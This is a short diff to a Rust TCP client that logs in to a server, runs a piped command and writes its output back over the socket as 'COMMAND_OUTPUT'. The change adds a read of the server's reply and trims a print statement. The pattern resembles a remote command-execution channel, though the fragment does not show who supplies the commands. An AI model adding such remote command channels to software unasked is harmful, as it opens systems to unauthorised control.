@@ -18,7 +18,7 @@ fn main() {
                     match stream.read(&mut response) {
                         Ok(bytes_read) => {
                             let response = String::from_utf8_lossy(&response[..bytes_read]);
-                            println!("Server response: {}", response);
+                            println!("{}", response);
 
                             // Update connected state if login is successful
                             if response.contains("Login successful") {
@@ -38,6 +38,16 @@ fn main() {
                     let resultat = run_piped_command(&buffer);
                     let formatted_message = format!("COMMAND_OUTPUT:{}", resultat);
                     stream.write(formatted_message.as_bytes()).unwrap();
+                    match stream.read(&mut response) {
+                        Ok(bytes_read) => {
+                            let response = String::from_utf8_lossy(&response[..bytes_read]);
+                            println!("{}", response);
+                        }
+                        Err(e) => {
+                            eprintln!("Failed to read response: {}", e);
+                            break;
+                        }
+                    }
                 }
             }
         }
